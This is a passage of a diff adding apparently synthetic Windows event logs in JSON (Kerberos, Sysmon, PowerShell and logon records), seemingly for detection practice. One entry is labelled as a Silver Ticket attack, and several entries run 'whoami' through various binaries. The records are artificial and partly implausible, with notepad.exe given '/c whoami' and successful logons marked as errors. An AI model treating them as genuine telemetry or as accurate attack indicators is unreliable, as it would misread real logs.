+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 236,
+    "timestamp": "2025-08-18T03:55:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Program Files\\7-Zip\\7z.exe",
+    "command_line": "C:\\Program Files\\7-Zip\\7z.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 235,
+    "timestamp": "2025-08-18T03:54:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 234,
+    "timestamp": "2025-08-18T03:53:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 233,
+    "timestamp": "2025-08-18T03:52:00Z",
+    "host": "WS01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 232,
+    "timestamp": "2025-08-18T03:51:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 231,
+    "timestamp": "2025-08-18T03:50:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 230,
+    "timestamp": "2025-08-18T03:49:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 229,
+    "timestamp": "2025-08-18T03:48:00Z",
+    "host": "WS01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Error",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 228,
+    "timestamp": "2025-08-18T03:47:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\svchost.exe",
+    "command_line": "C:\\Windows\\System32\\svchost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 227,
+    "timestamp": "2025-08-18T03:46:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Error",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 226,
+    "timestamp": "2025-08-18T03:45:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 225,
+    "timestamp": "2025-08-18T03:44:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 224,
+    "timestamp": "2025-08-18T03:43:00Z",
+    "host": "WS01",
+    "user": "msmith",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 223,
+    "timestamp": "2025-08-18T03:42:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 222,
+    "timestamp": "2025-08-18T03:41:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 221,
+    "timestamp": "2025-08-18T03:40:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "attack_category": "Silver Ticket",
+    "attack_technique": "T1558.002",
+    "message": "Service ticket for HOST/WS02 with invalid PAC signature (possible Silver Ticket). Service: HOST/WS02; Client Address: 10.10.5.23.",
+    "tags": [
+      "attack",
+      "kerberos",
+      "silver-ticket"
+    ]
+  },
+  {
+    "id": 220,
+    "timestamp": "2025-08-18T03:39:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Error",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 219,
+    "timestamp": "2025-08-18T03:38:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 218,
+    "timestamp": "2025-08-18T03:37:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 217,
+    "timestamp": "2025-08-18T03:36:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 216,
+    "timestamp": "2025-08-18T03:35:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 215,
+    "timestamp": "2025-08-18T03:34:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 214,
+    "timestamp": "2025-08-18T03:33:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 213,
+    "timestamp": "2025-08-18T03:32:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 212,
+    "timestamp": "2025-08-18T03:31:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\msiexec.exe",
+    "command_line": "C:\\Windows\\System32\\msiexec.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 211,
+    "timestamp": "2025-08-18T03:30:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 210,
+    "timestamp": "2025-08-18T03:29:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 209,
+    "timestamp": "2025-08-18T03:28:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\conhost.exe",
+    "command_line": "C:\\Windows\\System32\\conhost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 208,
+    "timestamp": "2025-08-18T03:27:00Z",
+    "host": "WEB01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 207,
+    "timestamp": "2025-08-18T03:26:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 206,
+    "timestamp": "2025-08-18T03:25:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 205,
+    "timestamp": "2025-08-18T03:24:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 204,
+    "timestamp": "2025-08-18T03:23:00Z",
+    "host": "WEB01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 203,
+    "timestamp": "2025-08-18T03:22:00Z",
+    "host": "WEB01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Warning",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 202,
+    "timestamp": "2025-08-18T03:21:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\rundll32.exe",
+    "command_line": "C:\\Windows\\System32\\rundll32.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 201,
+    "timestamp": "2025-08-18T03:20:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 200,
+    "timestamp": "2025-08-18T03:19:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 199,
+    "timestamp": "2025-08-18T03:18:00Z",
+    "host": "DC01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 198,
+    "timestamp": "2025-08-18T03:17:00Z",
+    "host": "WS01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 197,
+    "timestamp": "2025-08-18T03:16:00Z",
+    "host": "FILE01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 196,
+    "timestamp": "2025-08-18T03:15:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 195,
+    "timestamp": "2025-08-18T03:14:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 194,
+    "timestamp": "2025-08-18T03:13:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 193,
+    "timestamp": "2025-08-18T03:12:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 192,
+    "timestamp": "2025-08-18T03:11:00Z",
+    "host": "DC01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 191,
+    "timestamp": "2025-08-18T03:10:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 190,
+    "timestamp": "2025-08-18T03:09:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Error",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 189,
+    "timestamp": "2025-08-18T03:08:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 188,
+    "timestamp": "2025-08-18T03:07:00Z",
+    "host": "SQL01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Error",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 187,
+    "timestamp": "2025-08-18T03:06:00Z",
+    "host": "WS02",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 186,
+    "timestamp": "2025-08-18T03:05:00Z",
+    "host": "WS02",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 185,
+    "timestamp": "2025-08-18T03:04:00Z",
+    "host": "WS02",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 184,
+    "timestamp": "2025-08-18T03:03:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 183,
+    "timestamp": "2025-08-18T03:02:00Z",
+    "host": "DC01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 182,
+    "timestamp": "2025-08-18T03:01:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 181,
+    "timestamp": "2025-08-18T03:00:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 180,
+    "timestamp": "2025-08-18T02:59:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 179,
+    "timestamp": "2025-08-18T02:58:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 178,
+    "timestamp": "2025-08-18T02:57:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Information",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 177,
+    "timestamp": "2025-08-18T02:56:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Error",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 176,
+    "timestamp": "2025-08-18T02:55:00Z",
+    "host": "WS01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\wscript.exe",
+    "command_line": "C:\\Windows\\System32\\wscript.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 175,
+    "timestamp": "2025-08-18T02:54:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Error",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 174,
+    "timestamp": "2025-08-18T02:53:00Z",
+    "host": "WS01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Warning",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 173,
+    "timestamp": "2025-08-18T02:52:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 172,
+    "timestamp": "2025-08-18T02:51:00Z",
+    "host": "SQL01",
+    "user": "Administrator",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Warning",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 171,
+    "timestamp": "2025-08-18T02:50:00Z",
+    "host": "WEB01",
+    "user": "jdoe",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 170,
+    "timestamp": "2025-08-18T02:49:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Error",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 169,
+    "timestamp": "2025-08-18T02:48:00Z",
+    "host": "WS02",
+    "user": "guest",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Information",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 168,
+    "timestamp": "2025-08-18T02:47:00Z",
+    "host": "WEB01",
+    "user": "svc_backup",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Error",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 167,
+    "timestamp": "2025-08-18T02:46:00Z",
+    "host": "FILE01",
+    "user": "svc_backup",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Error",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 166,
+    "timestamp": "2025-08-18T02:45:00Z",
+    "host": "FILE01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\cmd.exe",
+    "command_line": "C:\\Windows\\System32\\cmd.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 165,
+    "timestamp": "2025-08-18T02:44:00Z",
+    "host": "WEB01",
+    "user": "svc_sql",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 164,
+    "timestamp": "2025-08-18T02:43:00Z",
+    "host": "DC01",
+    "user": "guest",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 163,
+    "timestamp": "2025-08-18T02:42:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Information",
+    "message": "An account failed to log on.",
+    "tags": [
+      "logon",
+      "failed"
+    ]
+  },
+  {
+    "id": 162,
+    "timestamp": "2025-08-18T02:41:00Z",
+    "host": "FILE01",
+    "user": "svc_sql",
+    "source": "Sysmon",
+    "event_id": 7,
+    "level": "Warning",
+    "message": "Image loaded.",
+    "tags": [
+      "sysmon",
+      "image"
+    ]
+  },
+  {
+    "id": 161,
+    "timestamp": "2025-08-18T02:40:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 160,
+    "timestamp": "2025-08-18T02:39:00Z",
+    "host": "SQL01",
+    "user": "jdoe",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Information",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 159,
+    "timestamp": "2025-08-18T02:38:00Z",
+    "host": "SQL01",
+    "user": "guest",
+    "source": "Sysmon",
+    "event_id": 3,
+    "level": "Error",
+    "message": "Network connection detected.",
+    "tags": [
+      "sysmon",
+      "net"
+    ]
+  },
+  {
+    "id": 158,
+    "timestamp": "2025-08-18T02:37:00Z",
+    "host": "FILE01",
+    "user": "Administrator",
+    "source": "Sysmon",
+    "event_id": 1,
+    "level": "Warning",
+    "image": "C:\\Windows\\System32\\svchost.exe",
+    "command_line": "C:\\Windows\\System32\\svchost.exe /?",
+    "message": "Process Create detected.",
+    "tags": [
+      "sysmon",
+      "proc"
+    ]
+  },
+  {
+    "id": 157,
+    "timestamp": "2025-08-18T02:36:00Z",
+    "host": "WS01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4688,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\notepad.exe",
+    "command_line": "C:\\Windows\\System32\\notepad.exe /c whoami",
+    "message": "A new process has been created.",
+    "tags": [
+      "process",
+      "create"
+    ]
+  },
+  {
+    "id": 156,
+    "timestamp": "2025-08-18T02:35:00Z",
+    "host": "WS02",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 155,
+    "timestamp": "2025-08-18T02:34:00Z",
+    "host": "DC01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Information",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 154,
+    "timestamp": "2025-08-18T02:33:00Z",
+    "host": "WS02",
+    "user": "Administrator",
+    "source": "Kerberos",
+    "event_id": 4768,
+    "level": "Warning",
+    "message": "A Kerberos authentication ticket (TGT) was requested.",
+    "tags": [
+      "kerberos",
+      "tgt"
+    ]
+  },
+  {
+    "id": 153,
+    "timestamp": "2025-08-18T02:32:00Z",
+    "host": "DC01",
+    "user": "msmith",
+    "source": "PowerShell",
+    "event_id": 4103,
+    "level": "Information",
+    "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "command_line": "powershell.exe -NoProfile -Command \"Get-Process | Select-Object -First 3\"",
+    "message": "Module logging: PowerShell command started.",
+    "tags": [
+      "powershell",
+      "module"
+    ]
+  },
+  {
+    "id": 152,
+    "timestamp": "2025-08-18T02:31:00Z",
+    "host": "SQL01",
+    "user": "svc_sql",
+    "source": "Kerberos",
+    "event_id": 4769,
+    "level": "Warning",
+    "message": "A Kerberos service ticket was requested.",
+    "tags": [
+      "kerberos",
+      "tgs"
+    ]
+  },
+  {
+    "id": 151,
+    "timestamp": "2025-08-18T02:30:00Z",
+    "host": "SQL01",
+    "user": "svc_backup",
+    "source": "WindowsSecurity",
+    "event_id": 4624,
+    "level": "Information",
+    "message": "An account was successfully logged on.",
+    "tags": [
+      "logon",
+      "success"
+    ]
+  },
+  {
+    "id": 150,
+    "timestamp": "2025-08-18T02:29:00Z",
+    "host": "WEB01",
+    "user": "msmith",
+    "source": "WindowsSecurity",
+    "event_id": 4625,
+    "level": "Warning",
